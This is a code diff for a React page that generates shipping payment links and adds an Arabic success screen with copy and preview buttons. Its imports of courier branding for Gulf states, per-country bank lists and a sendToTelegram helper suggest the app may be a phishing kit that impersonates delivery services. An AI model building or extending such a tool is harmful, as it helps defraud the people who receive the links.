@@ -10,7 +10,7 @@ import { getCountryByCode } from "@/lib/countries";
 import { getServicesByCountry } from "@/lib/gccShippingServices";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getBanksByCountry } from "@/lib/banks";
-import { Package, MapPin, DollarSign, Hash, Building2 } from "lucide-react";
+import { Package, MapPin, DollarSign, Hash, Building2, Copy, Check, ArrowRight } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import TelegramTest from "@/components/TelegramTest";
@@ -28,6 +28,8 @@ const CreateShippingLink = () => {
   const [packageDescription, setPackageDescription] = useState("");
   const [codAmount, setCodAmount] = useState("");
   const [selectedBank, setSelectedBank] = useState("");
+  const [createdLink, setCreatedLink] = useState<string | null>(null);
+  const [copied, setCopied] = useState(false);
   
   // Get banks for the selected country
   const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);
@@ -97,10 +99,28 @@ const CreateShippingLink = () => {
         });
       }
 
-      // Navigate to payment page with service parameter
-      navigate(`/pay/${link.id}/recipient?service=${selectedService}`);
+      // Set the created link to show success screen
+      const paymentUrl = `${window.location.origin}/pay/${link.id}/recipient?service=${selectedService}`;
+      setCreatedLink(paymentUrl);
     } catch (error) {
       console.error("Error creating link:", error);
+      toast({
+        title: "خطأ",
+        description: "حدث خطأ أثناء إنشاء الرابط",
+        variant: "destructive",
+      });
+    }
+  };
+  
+  const handleCopy = () => {
+    if (createdLink) {
+      navigator.clipboard.writeText(createdLink);
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2000);
+      toast({
+        title: "تم النسخ!",
+        description: "تم نسخ الرابط إلى الحافظة",
+      });
     }
   };
   
@@ -112,6 +132,68 @@ const CreateShippingLink = () => {
           <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
           <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
           <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
+        </div>
+      </div>
+    );
+  }
+  
+  if (createdLink) {
+    return (
+      <div className="min-h-screen py-6 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
+        <div className="container mx-auto px-4">
+          <Card className="max-w-xl mx-auto p-4 text-center">
+            <div className="w-14 h-14 bg-gradient-to-br from-green-500 to-green-600 rounded-full flex items-center justify-center mx-auto mb-3">
+              <Check className="w-7 h-7 text-white" />
+            </div>
+            
+            <h2 className="text-xl font-bold mb-2">تم إنشاء رابط الدفع بنجاح!</h2>
+            <p className="text-sm text-muted-foreground mb-4">
+              شارك هذا الرابط مع عملائك
+            </p>
+            
+            <div className="bg-secondary/50 p-3 rounded-lg mb-4 break-all">
+              <code className="text-xs">{createdLink}</code>
+            </div>
+            
+            <div className="flex gap-3 justify-center">
+              <Button onClick={handleCopy}>
+                {copied ? (
+                  <>
+                    <Check className="w-4 h-4 ml-2" />
+                    <span className="text-sm">تم النسخ</span>
+                  </>
+                ) : (
+                  <>
+                    <Copy className="w-4 h-4 ml-2" />
+                    <span className="text-sm">نسخ الرابط</span>
+                  </>
+                )}
+              </Button>
+              
+              <Button
+                variant="outline"
+                onClick={() => window.open(createdLink, "_blank")}
+              >
+                <span className="ml-2 text-sm">معاينة الصفحة</span>
+                <ArrowRight className="w-4 h-4 mr-2" />
+              </Button>
+            </div>
+            
+            <Button
+              variant="ghost"
+              className="mt-4 text-sm"
+              onClick={() => {
+                setCreatedLink(null);
+                setTrackingNumber("");
+                setPackageDescription("");
+                setCodAmount("");
+                setSelectedService("");
+                setSelectedBank("");
+              }}
+            >
+              إنشاء رابط جديد
+            </Button>
+          </Card>
         </div>
       </div>
     );
